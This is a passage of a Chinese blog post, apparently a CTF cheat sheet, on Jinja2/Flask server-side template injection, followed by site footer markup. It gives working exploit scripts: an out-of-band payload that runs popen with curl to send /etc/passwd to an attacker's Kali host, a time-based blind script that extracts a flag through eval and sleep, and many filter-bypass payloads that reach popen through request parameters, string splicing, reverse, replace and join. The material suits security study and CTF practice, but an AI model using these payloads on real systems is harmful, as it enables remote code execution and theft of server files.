+<h4 id="带外注入"><a href="#带外注入" class="headerlink" title="带外注入"></a>带外注入</h4><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">import requests</span></span><br><span class="line"><span class="language-xml">url = &quot;http://127.0.0.1:&quot; #URL</span></span><br><span class="line"><span class="language-xml">for i in range(300):</span></span><br><span class="line"><span class="language-xml">    try:</span></span><br><span class="line"><span class="language-xml">        data=&#123;&quot;post参数&quot;:&#x27;</span><span class="template-variable">&#123;&#123;<span class="name">&quot;&quot;.__class__.__base__.__subclasses__</span>()[&#x27;+str(i)+&#x27;].__init__.__globals__[&quot;popen&quot;](<span class="name">&quot;curl http://192.168.5.51(kaliIP)/`cat /etc/passwd`&quot;</span>).read()&#125;&#125;</span><span class="language-xml">&#x27;&#125;</span></span><br><span class="line"><span class="language-xml">        response = requests.post(url,data=data)</span></span><br><span class="line"><span class="language-xml">    except:</span></span><br><span class="line"><span class="language-xml">        pass</span></span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;同时kali开启一个python http监听(python3 -m http.server 80)</p>
+<h4 id="纯盲注"><a href="#纯盲注" class="headerlink" title="纯盲注"></a>纯盲注</h4><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">import requests</span></span><br><span class="line"><span class="language-xml">import time</span></span><br><span class="line"><span class="language-xml">url = input(&quot;请输入 URL：&quot;)</span></span><br><span class="line"><span class="language-xml">request_parameter = input(&quot;请输入 POST 请求参数：&quot;)</span></span><br><span class="line"><span class="language-xml">cs = &quot; !\&quot;#$%&amp;&#x27;()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~&quot;</span></span><br><span class="line"><span class="language-xml">flag = &quot;&quot;</span></span><br><span class="line"><span class="language-xml"># range() 参数为 脚本2 得到的 flag 长度</span></span><br><span class="line"><span class="language-xml">for i in range(25):</span></span><br><span class="line"><span class="language-xml">    low = 0</span></span><br><span class="line"><span class="language-xml">    high = len(cs)</span></span><br><span class="line"><span class="language-xml">    while low<span class="tag">&lt;<span class="name">high:</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">index</span> = <span class="string">low</span> + (<span class="attr">high</span> <span class="attr">-</span> <span class="attr">low</span>) // <span class="attr">2</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">start_time</span> = <span class="string">time.time()</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        # <span class="attr">request_parameter</span> <span class="attr">为</span> <span class="attr">post</span> <span class="attr">传入数据的参数名</span>，<span class="attr">根据实际情况输入</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">data</span> = <span class="string">&#123;</span> <span class="attr">request_parameter:</span>&quot;</span></span><span class="template-tag">&#123;%</span><span class="name">set</span> flag=().__class__.__base__.__subclasses__()[<span class="number">66</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(\&quot;os\&quot;).popen(\&quot;cat flag\&quot;).read()&#x27;</span>)<span class="template-tag">%&#125;</span><span class="template-tag">&#123;%</span><span class="name">if</span> flag[<span class="string">&quot;+str(i)+&quot;</span>]==<span class="string">&#x27;&quot;+cs[index]+&quot;&#x27;</span><span class="template-tag">%&#125;</span><span class="template-variable">&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">66</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(\&quot;time\&quot;).sleep(2)&#x27;</span>)&#125;&#125;</span><span class="template-tag">&#123;%</span><span class="name">elif</span> flag[<span class="string">&quot;+str(i)+&quot;</span>]&gt;<span class="string">&#x27;&quot;+cs[index]+&quot;&#x27;</span><span class="template-tag">%&#125;</span><span class="template-variable">&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">66</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(\&quot;time\&quot;).sleep(4)&#x27;</span>)&#125;&#125;</span><span class="template-tag">&#123;%</span><span class="name">endif</span><span class="template-tag">%&#125;</span><span class="language-xml"><span class="tag">&quot; &#125;</span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">response</span> = <span class="string">requests.post(url,</span> <span class="attr">data</span>=<span class="string">data)</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">end_time</span> = <span class="string">time.time()</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        # <span class="attr">计算响应时间</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">response_time</span> = <span class="string">end_time</span> <span class="attr">-</span> <span class="attr">start_time</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">if</span> <span class="attr">response_time</span> &gt;</span>=2 and response_time&lt;=4:</span></span><br><span class="line"><span class="language-xml">            flag+=cs[index]</span></span><br><span class="line"><span class="language-xml">            print(cs[index],end=&#x27;\t&#x27;)</span></span><br><span class="line"><span class="language-xml">            low = high</span></span><br><span class="line"><span class="language-xml">        elif response_time&gt;4:</span></span><br><span class="line"><span class="language-xml">            low = index+1</span></span><br><span class="line"><span class="language-xml">        else:</span></span><br><span class="line"><span class="language-xml">            high = index</span></span><br><span class="line"><span class="language-xml">print(&quot;\n&quot;+flag)</span></span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;二分法直接爆破flag。  </p>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><h4 id="双大括号"><a href="#双大括号" class="headerlink" title="双大括号"></a>双大括号</h4><p>&emsp;&emsp;双大括号被过滤，可尝试glory能否正常执行，通过则可以用</p>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%if <span class="string">&quot;&quot;</span>.__class__.__base__.....&#125;glory&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="中括号"><a href="#中括号" class="headerlink" title="中括号"></a>中括号</h4><p>&emsp;&emsp;中括号被过滤，可尝试__getitem__()来代替[],类似于</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;&quot;<span class="name">.__class__.__base__.subclasses__90.__getitem__</span>(<span class="name">1</span>)&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="单双引号"><a href="#单双引号" class="headerlink" title="单双引号"></a>单双引号</h4><p>&emsp;&emsp;单双引号被过滤，可尝试<font color=red>request.args.GET参数或request.form.POST参数</font>来进行绕过,类似于</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;()<span class="name">.__class__.__base__.__subclasses__</span>()[117].__init__.__globals__[request.form.a](<span class="name">request.form.b</span>).read()&#125;&#125;</span><span class="language-xml">&amp;a=popen&amp;b=cat /flag.txt</span></span><br></pre></td></tr></table></figure>
+<h4 id="下划线"><a href="#下划线" class="headerlink" title="下划线"></a>下划线</h4><p>&emsp;&emsp;同理可以使用request创建一个变量，在变量里面使用下划线。<br>&emsp;&emsp;使用unicode，base64编码或者16位编码。<br>&emsp;&emsp;格式化字符串。  </p>
+<h4 id="点"><a href="#点" class="headerlink" title="点"></a>点</h4><p>&emsp;&emsp;可以使用中括号[]代替点，类似于</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()<span class="selector-attr">[<span class="string">&#x27;__class__&#x27;</span>]</span><span class="selector-attr">[<span class="string">&#x27;__base__&#x27;</span>]</span>......&#125;&#125;  </span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;可以使用attr()函数,类似于</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;()|<span class="name">attr</span>(<span class="name">&#x27;__class__&#x27;</span>)|attr(<span class="name">&#x27;__base__&#x27;</span>)......&#125;&#125;</span><span class="language-xml">  </span></span><br></pre></td></tr></table></figure>
+
+<h4 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h4><h5 id="“-”拼接"><a href="#“-”拼接" class="headerlink" title="“+”拼接"></a>“+”拼接</h5><p>&emsp;&emsp;类似于</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()<span class="selector-attr">[<span class="string">&#x27;__cl&#x27;</span>+<span class="string">&#x27;ass__&#x27;</span>]</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="jinjia2中的”-”拼接"><a href="#jinjia2中的”-”拼接" class="headerlink" title="jinjia2中的”~”拼接"></a>jinjia2中的”~”拼接</h5><p>&emsp;&emsp;类似于</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span> <span class="attribute">a</span>=<span class="string">&#x27;__cla&#x27;</span>%&#125;&#123;%<span class="built_in">set</span> <span class="attribute">b</span>=<span class="string">&#x27;ss__&#x27;</span>%&#125;&#123;&#123;()[a~b]&#125;&#125;  </span><br></pre></td></tr></table></figure>
+
+<h5 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h5><p>&emsp;&emsp;类似于</p>
+<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span><span class="name">set</span> a=<span class="string">&quot;__ssalc__&quot;</span><span class="punctuation">|</span><span class="keyword">reverse</span><span class="template-tag">%&#125;</span><span class="template-variable">&#123;&#123;()[a]&#125;&#125;</span><span class="language-xml">  </span></span><br></pre></td></tr></table></figure>
+
+<h5 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h5><p>&emsp;&emsp;类似于</p>
+<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span><span class="name">set</span> a=<span class="string">&quot;__claee__&quot;</span><span class="punctuation">|</span><span class="keyword">replace</span>(<span class="string">&quot;ee&quot;</span>,<span class="string">&quot;ss&quot;</span>)<span class="template-tag">%&#125;</span><span class="template-variable">&#123;&#123;()[a]&#125;&#125;</span><span class="language-xml">  </span></span><br></pre></td></tr></table></figure>
+
+<h5 id="join"><a href="#join" class="headerlink" title="join"></a>join</h5><p>&emsp;&emsp;类似于</p>
+<figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;%<span class="name">set</span> a=dict(__cla=a,ss__=a)|<span class="name">join</span>%&#125;</span><span class="template-variable">&#123;&#123;()[a]&#125;&#125;</span><span class="language-xml">  </span></span><br></pre></td></tr></table></figure>
+
+<h5 id="利用python的char的ASCII码"><a href="#利用python的char的ASCII码" class="headerlink" title="利用python的char的ASCII码"></a>利用python的char的ASCII码</h5><h4 id="数字"><a href="#数字" class="headerlink" title="数字"></a>数字</h4><p>&emsp;&emsp;不允许有数字，我们就让它们自己计算出数字再利用，可用到length，用法如下:10,输出结果为10，以此还可以进行加减乘除的运算。  </p>
+<h4 id="获取符号"><a href="#获取符号" class="headerlink" title="获取符号"></a>获取符号</h4><p>&emsp;&emsp;利用flask内置函数和对象获取符号，具体用法如下:<br>1.使用list可查看拆分字符  </p>
+<figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;%<span class="name">set</span> a=(&#123;&#125;|select()|string())|list%&#125;</span><span class="template-variable">&#123;&#123;a&#125;&#125;</span><span class="language-xml">  </span></span><br></pre></td></tr></table></figure>
+<p>2.[x]可调取第x位字符(从0计位数)  </p>
+<figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;%<span class="name">set</span> a=(&#123;&#125;|select()|string())|[x]%&#125;</span><span class="template-variable">&#123;&#123;a&#125;&#125;</span><span class="language-xml">  </span></span><br></pre></td></tr></table></figure>
+
+<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>&emsp;&emsp;乘风破浪会有时，直挂云帆济沧海。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/SSTI%E6%B3%A8%E5%85%A5/" rel="tag"># SSTI注入</a>
+              <a href="/tags/%E6%B3%A8%E5%85%A5/" rel="tag"># 注入</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/08/03/GitHack/" rel="prev" title="GitHack">
+                  <i class="fa fa-angle-left"></i> GitHack
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">muxiahuo</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">56k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">51 分钟</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script><script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>
